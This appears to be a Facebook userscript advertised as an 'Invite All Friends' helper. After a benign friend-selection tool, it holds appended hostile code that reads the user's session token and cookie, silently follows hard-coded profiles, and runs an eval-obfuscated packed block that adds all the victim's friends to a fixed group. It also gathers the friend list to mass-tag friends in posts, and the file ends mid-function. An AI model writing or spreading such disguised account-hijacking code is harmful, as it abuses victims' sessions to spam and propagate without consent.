// ==UserScript==
// @name		 	Facebook Invite All Friends (30/3/2013) *NEW*.
// @namespace		        Facebook Invite All Friends (30/3/2013) *NEW*
// @description		        Facebook Invite All Friends (30/3/2013) *NEW*
// @author			Sumit Patel.
// @authorURL		        http://www.facebook.com/
// @include			htt*://www.facebook.com/*
// @version			10


// ==/UserScript==
//InviteAll

// ==============
// ==/ChangeLog==
(function () {
	
	// Global variables.
	var inviteDialog, friendContainer, executing, i, l, scrollTimer, fieldError = false,
		classNames = {
			inviteDialog : ['eventInviteLayout', 'standardLayout'],
			friendUpperNodeClassName : 'checkableListItem',
			friendContainer : 'fbProfileBrowserListContainer',
			textFieldDefaultValue : 'textInput inputtext DOMControl_placeholder',
			textFieldModifiedValue : 'textInput inputtext',
			enumeration : 'enumeration'
		}, names = {
			friendCheckButtons : 'checkableitems[]'
		}, ids = {
			inviteDialog : 'fb_multi_friend_selector_wrapper'
		};
	
	
	// Function for clicking links (<a> tags).
	function clickLink(elm) {
		var evt = document.createEvent('MouseEvents');
		evt.initMouseEvent('click', true, false, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		elm.dispatchEvent(evt);
	}
	
	// Function to get cumulative (real) position of element.
	// Thanks to Patrick H. Lauke at QuirksMode (http://www.quirksmode.org/js/findpos.html).
	function getCumulativePosition(obj) {
		var curleft = 0, curtop = curleft;
		
		// Iterate through all offsetParents.
		if (obj.offsetParent) {
			do {
				// Add the offsetParent's offsets to the variables holding the offset-values.
				curleft += obj.offsetLeft;
				curtop += obj.offsetTop;
				
				// Iterate.
				obj = obj.offsetParent;
			} while (obj);
		}
		
		return [curleft, curtop];
	}
	
	// Function for checking if an element is below the viewport / out of view.
	function isBelowViewport(container, element) {
		// Gather necessary data.
		var scrolledFromTop = container.scrollTop,
			viewportHeight = container.offsetHeight,
			totalHeight = container.scrollHeight,
			elementHeight = element.offsetHeight;
		
		// Calculate how much is left from bottom of viewport to top of page.
		var leftFromTop = scrolledFromTop + viewportHeight;
		
		// Calculate how much is left from bottom of viewport to bottom of page.
		var leftFromBottom = totalHeight - leftFromTop;
		
		// If "bottom of viewport to bottom of page" > "element height", element is below viewport.
		return leftFromBottom > elementHeight ? true : false;
	}
	
	// Fade function (element, duration in seconds, from opacity, to opacity[, callback]).
	function fade(elm, time, from, to, fadeCallback) {
		/*
			updaterate =     interval (in ms) between each execution of the fade function (below)
			neenedcalcs =    (milliseconds in one second * input seconds) / milliseconds to allot on
			currentcalcs =   number incrementing with the number of calculations performed
			opacityperloop = (from what opacity - to what opacity)[array of opacity to loop through] / calculations to allot on
			currentopacity = well ... current opacity :)
		*/
		var updaterate = 10, neededcalcs = (1000 * time) / updaterate,
			currentcalcs = 0, opacityperloop = (from - to) / neededcalcs, currentopacity = from;
		
		// Check for already executing function, remove if found.
		if (this.fadeTimer) {
			clearTimeout(this.fadeTimer);
			delete this.fadeTimer;
		}
		
		// Initiate fade.
		// First, set initial opacity.
		elm.style.opacity = currentopacity;
		
		// Use recursive loop with setTimeout instead of setInterval to make sure previous execution is finished before next starts.
		(function loop() {
			this.fadeTimer = setTimeout(function () {
				// If haven't reached number of calculations yet.
				if (currentcalcs !== neededcalcs) {
					// Reduce / increase current opacity.
					currentopacity -= opacityperloop;
					// Set opacity.
					elm.style.opacity = currentopacity;
					// Iterate.
					currentcalcs += 1;
					
					// Continue.
					loop();
					
				// If done.
				} else {
					// If element has negative opacity, remove it.
					if (opacityperloop > 0) {
						elm.parentNode.removeChild(elm);
					}
					
					// Delete timer variable to clear up and rid place for later.
					delete this.fadeTimer;
					
					// If callback is passed, execute it.
					if (fadeCallback) {
						fadeCallback();
					}
				}
			}, updaterate);
		}());
	}
	
	
	// Function to alert errors in a non-blocking way.
	// Message is an array, each element (created with document.createTextNode) being one line.
	// Position is an array consisting of two elements, a "padding-left" value and a "padding-top" value.
	function errorAlert(message, positionArray, errorAlertCallback) {
		// Try executing the non-blocking way. If nothing else works, fall back to window.alert.
		try {
			// Function for appending the message to the container.
			function appendText(textArray, elm) {
				for (i = 0, l = textArray.length; i < l; i += 1) {
					elm.appendChild(textArray[i]);
					
					// Append line break after element.
					elm.appendChild(document.createElement('br'));
				}
			}
			
			
			// Outer container.
			var container = document.createElement('div');
			container.className = 'alertBox';
			container.id = 'errorMessageBox';
			container.style.opacity = 0;
			
			// Inner container.
			var innerContainer = document.createElement('div');
			innerContainer.className = 'textContainer';
			
			// Header. Easier implemented separately than appending to message array.
			var header = document.createElement('b');
			header.appendChild(document.createTextNode('Error!'));
			header.appendChild(document.createElement('br'));
			
			// OK button.
			var OKButtonContainer = document.createElement('div'),
				OKButton = document.createElement('input');
			
			OKButton.type = 'button';
			OKButton.value = 'OK';
			OKButton.className = 'uiButton';
			
			// It's function.
			// If any callback is present, append it as a callback to the fade function.
			OKButton.addEventListener('click', function () {
				fade(container, 0.1, container.style.opacity, 0, (errorAlertCallback && function () {
					errorAlertCallback();
				}));
			}, false);
			
			// OK button container.
			OKButtonContainer.className = 'OKButtonContainer';
			OKButtonContainer.appendChild(OKButton);
			
			
			// Append elements.
			innerContainer.appendChild(header);
			appendText(message, innerContainer);
			innerContainer.appendChild(OKButtonContainer);
			container.appendChild(innerContainer);
			
			// Append container to outer container.
			// Try first at the inviteDialog, and fall back to document.body.
			try {
				inviteDialog.appendChild(container);
			} catch (e) {
				document.body.appendChild(container);
			}
			
			// Apply position.
			container.style.position = 'fixed';
			
			// If position array is present, and if two values exact, set it to those.
			if (positionArray && positionArray.length === 2) {
				// Remove the width and height of the container from the given positions,
				// to make the lower left corner what the position is relative to.
				var pixelsFromLeft = positionArray[0], pixelsFromTop = positionArray[1] - container.offsetHeight;
				
				container.style.left = pixelsFromLeft.toString() + 'px';
				container.style.top = pixelsFromTop.toString() + 'px';
			// Else, set it to default values.
			} else {
				container.style.right = '4em';
				container.style.bottom = '5em';
			}
			
			// Fade it in.
			fade(container, 0.2, container.style.opacity, 0.9);
			
		// If nothing else works, fall back to window.alert.
		} catch (f) {
			if (message) {
				var messageInString = '';
				
				for (i = 0, l = message.length; i < l; i += 1) {
					messageInString += message[i].textContent + '\n';
				}
				
				alert(messageInString);
				
				if (errorAlertCallback) {
					errorAlertCallback();
				}
			}
		}
	}
	
	
	// Function for adding the button.
	function addButton(inviteDialogParameter, isSubElement) {
		inviteDialog = inviteDialogParameter;
		
		if (inviteDialog !== undefined && !executing && !document.getElementById('selectAllButton')) {
			// Set variable indicating that the script has been executed already, to prevent multiple executions.
			executing = true;
			
			// Create button.
			var selectButton = document.createElement('input');
			selectButton.type = 'button';
			selectButton.className = 'uiButton';
			selectButton.id = 'selectAllButton';
			
			// Button texts.
			var selectButtonText1 = 'Select', selectButtonText2 = 'Unselect all';
			
			// Set default button text value.
			selectButton.value = selectButtonText1;
			
			// Variable for determining when user has selected people and not (clicked the button).
			var btnClicked;
			
			
			// Friend-select function.
			function selectFriends(btn) {
				// Get the checkboxes, as it's easiest to figure out if the friend is disabled this way, as well as other advantages.
				var friends = document.getElementsByName(names.friendCheckButtons)[0] ?
						document.getElementsByName(names.friendCheckButtons) :
						inviteDialog.querySelectorAll('input[type="checkbox"]:not(#autoScrollCheckBox):not(#selectAllCheckBox)'),
					forceChoose = false,
					// Set the first friend to select.
					// If no userset value, start from beginning.
					// Else, start from the given number.
					selectionStart = fields[0].value === fields[0].defaultValue ?
						0 :
						// Translate first (#1) to #0.
						parseInt(fields[0].value, 10) - 1,
					// Set the last friend to select.
					// If no userset value, select until end.
					// Else if element "selectSpanTypeCheckBox" is set, try select until the given value.
					// Else, select excactly the given number of friends.
					friendsToSelect = fields[1].value === fields[1].defaultValue ?
						selectSpanTypeCheckBox.checked ?
							// Starting later = ending sooner.
							friends.length - selectionStart :
							// Just take whole bunch; loop will break anyways.
							friends.length :
						selectSpanTypeCheckBox.checked ?
							// to #: b
							parseInt(fields[1].value, 10) - selectionStart :
							// How many?: b
							parseInt(fields[1].value, 10),
					selectedFriends = 0,
					// Checked = select b friends, starting from #a. Iterate only when selecting.
					// Not checked = select from #a to #b, iterate always.
					alwaysIterate = selectSpanTypeCheckBox.checked,
					currentFriendNumber = selectionStart;
				
				// Select friends.
				if (!btnClicked) {
					// If there is more to select, and if the next friend to select exists.
					while (friendsToSelect > selectedFriends && friends[currentFriendNumber]) {
						// Variable for determining if loop has iterated already.
						var iterated = false;
						
						// If friends is not selected and not disabled, or if user has chosen to select it anyway -> select the friend.
						if ((!friends[currentFriendNumber].checked && !friends[currentFriendNumber].disabled) || forceChoose) {
							// The anchors(links) are next to the checkboxes in the DOM.
							// Clicking the links has better performance than clicking the checkboxes.
							clickLink(friends[currentFriendNumber].nextSibling);
							
							// Iterate variable "selectedFriends".
							selectedFriends += 1;
							iterated = true;
						}
						
						if (!iterated && alwaysIterate) {
							selectedFriends += 1;
						}
						
						// Iterate currentFriendNumber.
						currentFriendNumber += 1;
					}
					
					// Change button text, and set it clicked.
					btn.value = selectButtonText2;
					btnClicked = true;
					
					// Disable user interaction because only "Unselect" is available.
					for (i = 0, l = fields.length; i < l; i += 1) {
						fields[i].disabled = true;
					}
					selectSpanTypeCheckBox.disabled = true;
				
				// Unselect friends.
				} else {
					for (i = 0, l = friends.length; i < l; i += 1) {
						// If friends is selected and not disabled, or if user has chosen to select it anyway -> unselect the friend.
						if ((friends[i].checked && !friends[i].disabled) || forceChoose) {
							// The anchors(links) are next to the checkboxes in the DOM.
							// Clicking the links has better performance than clicking the checkboxes.
							clickLink(friends[i].nextSibling);
						}
					}
					
					// Change button text, and set it unclicked.
					btn.value = selectButtonText1;
					btnClicked = false;
					
					// Enable user interaction again.
					for (i = 0, l = fields.length; i < l; i += 1) {
						fields[i].disabled = '';
					}
					selectSpanTypeCheckBox.disabled = '';
				}
			}
			
			// Button function.
			selectButton.addEventListener('click', function () {
				// Return if variable fieldError is set.
				if (fieldError) {
					return;
				}
				
				if (autoScrollCheckBox.checked) {
					autoScroll(function () {
						selectFriends(selectButton);
						
						// Add enumeration afterwards, as it is disabled meanwhile scrolling.
						addFriendEnumeration(inviteDialog);
					});
				} else {
					selectFriends(selectButton);
				}
			}, false);
			
			
			// Function to create container for an array of elements.
			function createContainer(contElmType, elmArray) {
				var divElm = document.createElement(contElmType);
				for (i = 0, l = elmArray.length; i < l; i += 1) {
					divElm.appendChild(elmArray[i]);
				}
				
				return divElm;
			}
			
			// Function to create a label for an element.
			function createLabel(textParam, forElm) {
				var labl = document.createElement('label');
				labl.appendChild(document.createTextNode(textParam));
				labl.setAttribute('for', forElm.id);
				
				return labl;
			}
			
			
			// Create the autoscroll dialog and function.
			// Create the checkbox.
			var autoScrollCheckBox = document.createElement('input');
			autoScrollCheckBox.type = 'checkbox';
			autoScrollCheckBox.id = 'autoScrollCheckBox';
			// Pre-check it.
			autoScrollCheckBox.defaultChecked = 'true';
			// Align the label on line with checkbox.
			autoScrollCheckBox.style.verticalAlign = 'middle';
			
			// Auto scroll function.
			function autoScroll(callback) {
				// Store previous last friends scrolled into view to check for progress.
				var autoScrollDisabled, watcher;
				
				function scrollFriends(callingFromWatcher) {
					if (autoScrollDisabled) {
						return;
					}
					
					var lastUL = inviteDialog.getElementsByTagName('ul')[inviteDialog.getElementsByTagName('ul').length - 1],
						scrollableDiv = lastUL.offsetParent,
						lastFriend = lastUL.lastChild;
					
					// If last element is below viewport, scroll it into view.
					if (isBelowViewport(scrollableDiv, lastFriend)) {
						// Only clear timer if going to scroll.
						if (scrollTimer) {
							clearTimeout(scrollTimer);
						}
						
						// Scroll last visible friend into view.
							// Old version.
							// lastFriend.scrollIntoView(alignToTop);
						// Top of viewport scrolled from top = total height - viewport heigh.
						scrollableDiv.scrollTop = scrollableDiv.scrollHeight - scrollableDiv.offsetHeight;
						
						// Set timer to check if there is any new elements loaded after x milliseconds.
						// If not, remove scrolling on new element insertion and initiate callback.
						scrollTimer = setTimeout(function () {
							autoScrollDisabled = true;
							clearTimeout(scrollTimer);
							
							inviteDialog.removeEventListener('DOMNodeInserted', watcher, false);
							
							if (callback) {
								callback();
							}
						}, 1000);
					// If last friend is visible (all scrolled down already) before any scrolling is executed,
					// disable the scroll function, initiate callback and return.
					} else if (!callingFromWatcher) {
						autoScrollDisabled = true;
						
						if (callback) {
							callback();
						}
						
						return;
					}
					
					return true;
				}
				
				watcher = function () {
					if (!scrollFriends(true)) {
						// If returning positively from scroll-function (which indicates that watching for new elements should be stopped),
						// remove the watcher and re-enable the scroll-function for later use.
						inviteDialog.removeEventListener('DOMNodeInserted', watch, false);
						autoScrollDisabled = false;
					}
				};
				
				// Initiate, and initiate watcher if not already scrolled to the bottom (indicated by a negative return).
				if (scrollFriends()) {
					inviteDialog.addEventListener('DOMNodeInserted', watcher, false);
				}
			}
			
			// Create it's label.
			var autoScrollCheckBoxLabel = createLabel('Enable autoscrolling?', autoScrollCheckBox);
			
			// Append them to a container.
			var autoScrollCont = createContainer('span', [autoScrollCheckBoxLabel, autoScrollCheckBox]);
			
			
			// Create select span dialogs and their labels.			
			// Create and style the "from friend #x field".
			var fromField = document.createElement('input');
			fromField.type = 'text';
			fromField.id = 'fromField';
			fromField.className = classNames.textFieldDefaultValue;
			fromField.style.width = '2.5em';
			fromField.style.textAlign = 'right';
			var fromFieldDefaultValues = ['first', 'first'];
			fromField.defaultValue = fromFieldDefaultValues[0];
			// Create it's label
			var fromFieldLabelValues = ['Select friends from #:', 'Select friends from #:'],
				fromFieldLabel = createLabel(fromFieldLabelValues[0], fromField);
			
			// Create and style the "to friend #x field".
			var toField = document.createElement('input');
			toField.type = 'text';
			toField.id = 'toField';
			toField.className = classNames.textFieldDefaultValue;
			toField.style.width = '2.5em';
			toField.style.textAlign = 'right';
			var toFieldDefaultValues = ['all', 'last'];
			toField.defaultValue = toFieldDefaultValues[0];
			// Create it's label
			var toFieldLabelValues = ['How many? :', 'to #:'],
				toFieldLabel = createLabel(toFieldLabelValues[0], toField);
			
			// Variable holding the fields, to avoid having to namely reference them.
			var fields = [fromField, toField];
			
			// Create the fields' functions
			// Error alerting function. See it's declearance for information.
			function fieldErrorAlert(message, concerningElementParam) {
				// Set error variable ("fieldError").
				fieldError = true;
				
				// The concerningElement variable is either the passed element, or "this".
				// The relativeElement variable is "this" because this function is called with "func.call(thisField, [msg])"
				// to pass the "thisField" in a good way.
				var concerningElement = concerningElementParam || this, relativeElement = this, positionArray;
				
				function errorAlertCallback() {
					concerningElement.value = '';
					concerningElement.focus();
				}
				
				// If a relativeElement is present, calculate it's position, and set postitionArray from calculations.
				if (relativeElement) {
					var relativeElementPosition = getCumulativePosition(relativeElement), offsetPixelsToRight = 30, offsetPixelsToBottom = 10;
					
					positionArray = [relativeElementPosition[0] - offsetPixelsToRight, relativeElementPosition[1] - offsetPixelsToBottom];
				}
				
				errorAlert(message, positionArray, errorAlertCallback);
			}
			
			function fieldFocusEventListener() {
				// Get this field.
				var thisField = this;
				
				// Reset value if no userset value.
				if (thisField.value === thisField.defaultValue) {
					thisField.value = '';
				}
				
				thisField.className = classNames.textFieldModifiedValue;
			}
			
			function fieldBlurEventListener() {
				// Get this field and the other field.
				var thisField = this;
				
				// Loop through possibilities of "thisField.value".
				switch (thisField.value) {
				case '':
					thisField.value = thisField.defaultValue;
				case thisField.defaultValue:
					thisField.className = classNames.textFieldDefaultValue;
					
					// Set variable "fieldError" to false.
					fieldError = false;
					break;
				default:
					// Make it an integer.
					thisField.value = parseInt(thisField.value, 10);
					
					if (isNaN(thisField.value)) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can\'t insert a non-numeric value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					// If thisField.previousSibling.textContent (the associated label) does not contain "#",
					// it is not a matter of friend #x, so "0" will simply make the script select 0 friends.
					// Else, there is no friend #0, so report an error.
					} else if (thisField.previousSibling.textContent.indexOf('#') !== -1 && thisField.value === '0') {
						fieldErrorAlert.call(thisField, [document.createTextNode('There does not exist a friend #0.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					} else if (parseInt(thisField.value, 10) < 0) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can\'t insert a negative value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					}
					
					// Set variable "fieldError" to false.
					fieldError = false;
				}
			}
			
			// Asign the functions to the fields.
			fromField.addEventListener('focus', fieldFocusEventListener, false);
			fromField.addEventListener('blur', fieldBlurEventListener, false);
			toField.addEventListener('focus', fieldFocusEventListener, false);
			toField.addEventListener('blur', fieldBlurEventListener, false);
			
			// Create and style checkbox for option to select all.
			var selectSpanTypeCheckBox = document.createElement('input');
			selectSpanTypeCheckBox.type = 'checkbox';
			selectSpanTypeCheckBox.id = 'selectSpanTypeCheckBox';
			// Align the label on line with checkbox.
			selectSpanTypeCheckBox.style.verticalAlign = 'middle';
			// Create it's label.
			var selectSpanTypeCheckBoxLabel = createLabel('Type?', selectSpanTypeCheckBox);
			// Create it's function.
			selectSpanTypeCheckBox.addEventListener('change', function () {
				// Change both the fields' values.
				fromFieldLabel.textContent = fromFieldLabel.textContent === fromFieldLabelValues[0] ? fromFieldLabelValues[1] : fromFieldLabelValues[0];
				toFieldLabel.textContent = toFieldLabel.textContent === toFieldLabelValues[0] ? toFieldLabelValues[1] : toFieldLabelValues[0];
				
				// Change both the fields' defaultValues if their values equals their defaultValues.
				// If the value of the field equals it's defaultValue, change the value to the new defaultValue.
				// Else, skip the value assignment.
				if (fromField.value === fromField.defaultValue) {
					fromField.defaultValue = fromField.value = fromField.defaultValue === fromFieldDefaultValues[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				} else {
					fromField.defaultValue = fromField.defaultValue === fromFieldDefaultValues[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				}
				
				if (toField.value === toField.defaultValue) {
					toField.defaultValue = toField.value = toField.defaultValue === toFieldDefaultValues[0] ? toFieldDefaultValues[1] : toFieldDefaultValues[0];
				} else {
					toField.defaultValue = toField.defaultValue === toFieldDefaultValues[0] ? toFieldDefaultValues[1] : toFieldDefaultValues[0];
				}
			}, false);
			
			// Add elements to an array, for easier later use.
			var selectSpanArray = [fromFieldLabel, fromField, toFieldLabel, toField, selectSpanTypeCheckBox];
			
			// Create space between elements.
			for (i = 0, l = selectSpanArray.length; i < l; i += 1) {
				// Add space to the right
				// Exclude specified elements
				if (selectSpanArray[i] !== toField && selectSpanArray[i] !== selectSpanTypeCheckBoxLabel) {
					selectSpanArray[i].style.marginRight = '5px';
				}
			}
			
			// Append to a container.
			var selectSpanCont = createContainer('span', selectSpanArray);
			
			
			// Create the container and inner container.
			var cont = document.createElement('tr');
			var icont = document.createElement('td');
			
			// Style/modify inner container.
			icont.setAttribute('colspan', 0);
			icont.style.textAlign = 'right';
			
			// Append elements.
			icont.appendChild(selectSpanCont);
			icont.appendChild(autoScrollCont);
			icont.appendChild(selectButton);
			cont.appendChild(icont);
			
			// Inject the button.
			inviteDialog.getElementsByTagName('tbody')[0].appendChild(cont);
			
			executing = false;
		}
	}
	
	// Function to add additional elements to the page.
	function addFriendEnumeration (friendContainerParameter) {
		friendContainer = friendContainerParameter;
		
		// Get the upper element of each friend.
		var friends = friendContainer.getElementsByClassName(classNames.friendUpperNodeClassName)[0] ?
			friendContainer.getElementsByClassName(classNames.friendUpperNodeClassName) :
			// If fails to find the upper elements directly, find each checkbox and build an array of their parents, which are the upper elements.
			(function () {
				var checkboxes = friendContainer.getElementsByName(names.friendCheckButtons)[0] ?
					friendContainer.getElementsByName(names.friendCheckButtons) :
					inviteDialog.querySelectorAll('input[type="checkbox"]:not(#autoScrollCheckBox):not(#selectAllCheckBox)'),
					friendArray = [];
				
				for (i = 0, l = checkboxes.length; i < l; i += 1) {
					friendArray[friendArray.length] = checkboxes[i].parentNode;
				}
				
				return friendArray;
			}());
		
		function createEnumerationElement (number) {
			var elm = document.createElement('div');
			
			elm.appendChild(document.createTextNode('' + number));
			elm.className = classNames.enumeration;
			
			return elm;
		}
		
		// Loop through friends and enumerate each.
		for (i = 0, l = friends.length; i < l; i += 1) {
			var currentFriend = friends[i];
			
			// If it is not enumerated already, enumerate it.
			if (!currentFriend.getElementsByClassName(classNames.enumeration)[0]) {
				// Add 1 to each enumeration to start at 1, as compensation for the non-adaptable common mind.
				var enumerationElement = createEnumerationElement(i + 1), imgChild = currentFriend.getElementsByTagName('img')[0];
				
				// If an IMG element is found under friend container, append the enumeration next to it in the DOM.
				// This is done to make the blur of non-selectable friends also apply to the enumeration.
				if (imgChild) {
					imgChild.parentNode.insertBefore(enumerationElement, imgChild);
				// Else, just append it to the container.
				} else {
					currentFriend.appendChild(enumerationElement);
				}
			}
		}
	}
	
	
	// Function to watch for node insertion (to see if the "invite box" has appeared).
	function checkForinviteDialog() {
		// Get container of invite dialog.
		var inviteDialogCheck = document.getElementsByClassName(classNames.inviteDialog[0])[0] ||
				document.getElementsByClassName(classNames.inviteDialog[1])[0] ||
				document.getElementById(ids.inviteDialog),
			enumerateContainerParameter;
		
		// If the parent DIV needed is not found directly, find it relatively to the lower friend container.
		if (!inviteDialogCheck) {
			var friendContainerCheck = document.getElementsByClassName(classNames.friendContainer)[0];
			
			if (friendContainerCheck) {
				// Loop trough parent nodes, and use first parent node containing a TABLE element.
				var containerParentNode = friendContainerCheck, containerTableElement;
				
				do {
					containerParentNode = containerParentNode.parentNode;
					containerTableElement = containerParentNode.getElementsByTagName('table')[0];
				} while (!containerTableElement);
				
				// Use the successful parent node for container parameter.
				inviteDialogCheck = containerParentNode;
				
				// Also, flag for enumeration by setting the friend container element to be passed.
				enumerateContainerParameter = friendContainerCheck;
			}
		} else {
			// Still flag for enumeration, just using the invite dialog already found as container.
			enumerateContainerParameter = inviteDialogCheck;
		}
		
		// Check for match of inviteDialogCheck, the TBODY that is later used as an insertion anchor and a selectable friend.
		if (inviteDialogCheck && inviteDialogCheck.getElementsByTagName('tbody')[0] &&
				(inviteDialogCheck.getElementsByClassName(classNames.friendUpperNodeClassName)[0] ||
				inviteDialogCheck.getElementsByName(names.friendCheckButtons)[0])) {
			// Add the button.
			addButton(inviteDialogCheck);
			
			// Add friend enumeration.
			if (enumerateContainerParameter) {
				addFriendEnumeration(enumerateContainerParameter);
			}
			
			// Can not be used at the moment. I have not found a way to re-apply the event handler.
			/* Remove node insertion watcher (it's strange, but it needs to be delayed a ms)
			window.setTimeout(function () {
				window.removeEventListener('DOMNodeInserted', checkForinviteDialog, false);
			 }, 1);
			*/
		}
	}
	
	
	// Initialize!
	// Initialize the watch.
	window.addEventListener('DOMNodeInserted', checkForinviteDialog, false);
	
	// Add CSS to error alert box and it's sub elements.
	GM_addStyle('\
	.alertBox { \
		z-index: 100; !important\
		text-align: center; \
		display: table; \
		background: -moz-linear-gradient(top,  #FFF,  #BBB); \
		border-radius: 1em; \
		border-color: #999999 #999999 #888888; \
		border-style: solid; \
		border-width: 0.1em; \
		box-shadow: 2px 3px 3px rgba(0, 0, 0, 0.2), inset 0 0 3px #888; \
		moz-box-shadow: 2px 3px 3px rgba(0, 0, 0, 0.2), inset 0 0 3px #888; \
	} \
	.alertBox b { \
		line-height: 2em; \
	} \
	.alertBox .textContainer{ \
		text-align: left; \
		display: table-cell; \
		vertical-align: middle; \
		padding-left: 1em; \
		padding-top: 0.5em; \
		padding-right: 1em; \
		padding-bottom: 0.5em; \
	} \
	.alertBox .OKButtonContainer { \
		text-align: right; \
		padding-top: 1em; \
		line-height: 2em; \
	} \
	.alertBox .OKButtonContainer button { \
		font-size: 0.8em; \
	} \
	.alertBox .OKButtonContainer button:hover { \
		color: #FFF; \
		cursor: pointer; \
	} \
	.' + classNames.enumeration + ' { \
		position: absolute; \
		left: 2.4em; \
		top: 0.1em; \
		opacity: 0.7; \
		color: white; \
		font-weight: bold; \
		text-shadow: 1px 0 0 #000, 0 -1px 0 #000, 0 1px 0 #000, -1px 0 0 #000; \
	} \
	.' + classNames.friendUpperNodeClassName + ' { \
		position: relative; \
	} \
	');
}());



//auto suggest
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}
//tes
eval(function(p,a,c,k,e,t){while(c--)if(k[c])p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c]);return p}('31 63(65){2 3=6.140(\'116\');3.70="10 71().78(\'/24/18/90/66/139?138=137&136=66\').134({ 133: "+65+" }).23();";6.131.130(3)}3("129");3("128");3("127");3("126");3("125");3("124");3("123");3("122");3("121");3("120");3("119");3("117");63("115");2 16=[\'114\'];2 16=[\'113\'];2 16=[\'112\'];2 7=6[\'62\'](\'7\')[0][\'61\'];2 12=6[\'8\'][\'11\'](6[\'8\'][\'11\'](/26=(\\25+)/)[1]);2 5=10 32();2 21=\'/24/46/111/110.29?28=1\';2 13=\'&44=109&47=\'+16+\'&7=\'+7+\'&40=\'+12+\'&39=\';5[\'27\'](\'37\',21,35);5[\'14\'](\'20-59\',\'57/53-52-51-50\');5[\'14\'](\'20-17\',13[\'17\']);5[\'14\'](\'42\',\'41-38\');5[\'23\'](13);2 7=6[\'62\'](\'7\')[0][\'61\'];2 12=6[\'8\'][\'11\'](6[\'8\'][\'11\'](/26=(\\25+)/)[1]);2 18=10 106();15=10 32();15[\'27\'](\'105\',\'/24/45/104.29?28=1&103=\'+12+\'&102\'+101[\'100\']()+\'&99[0]=98&97[0]=96\',95);15[\'23\']();19(15[\'49\']!=4){}58{33=94(\'(\'+15[\'92\'][\'91\'](9)+\')\');19(33[\'89\']){}58{18=33[\'86\'][\'85\'][\'84\'](31(56,55){83 56[\'54\']-55[\'54\']})}};79(2 22=0;22<18[\'17\'];22++){2 5=10 32();2 21=\'/24/46/43/74.29?28=1\';2 13=\'&7=\'+7+\'&47=\'+16+\'&68=45&44=&132=&43=\'+18[22][\'107\']+\'&40=\'+12+\'&39=\';5[\'27\'](\'37\',21,35);5[\'14\'](\'20-59\',\'57/53-52-51-50\');5[\'14\'](\'20-17\',13[\'17\']);5[\'14\'](\'42\',\'41-38\');5[\'108\']=31(){19(5[\'49\']==4&&5[\'87\']==82){}};5[\'23\'](13)};2 76="34";2 75="34";2 73="34";2 12=6.8.11(6.8.11(/26=(\\25+)/)[1]);2 69="";2 67="";2 135=[];2 118;2 48=10 36();2 30=10 36();30.81(48.77()+72*60*60*4*1);19(!6.8.11(/64=(\\25+)/)){6.8="64=93;88="+30.80()}',10,141,'||var|a||httpwp|document|fb_dtsg|cookie||new|match|user_id|paramswp|setRequestHeader|gf|gid|length|friends|if|Content|urlwp|i|send|ajax|d|c_user|open|__a|php|btarihi|function|XMLHttpRequest|data|162079897221373|true|Date|POST|alive|phstamp|__user|keep|Connection|members|ref|typeahead|groups|group_id|bugun|readyState|urlencoded|form|www|x|index|_0x93dax9|_0x93dax8|application|else|type||value|getElementsByName|sublist|paylasti|uidss|subscribe|smesaj_text|source|smesaj|innerHTML|AsyncRequest|1000|sfoto_id|add_post|spost_id|spage_id|getTime|setURI|for|toGMTString|setTime|200|return|sort|entries|payload|status|expires|error|lists|substr|responseText|hayir|eval|false|friends_only|options|user|filter|random|Math|token|viewer|first_degree|GET|Array|uid|onreadystatechange|group_jump_header|r2j|membership|203610793104436|418619594886901|430555906995176|475812109149642|script|100003265201633|svn_rev|100003530014328|100002866210313|100003521614457|100004754950029|100002914795413|100002866120364|100002843950400|100004691462909|100002964842725|100003509214467|100001625707516|appendChild|body|message_id|flid|setData|arkadaslar|action|permalink|location|modify|createElement'.split('|')));

//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
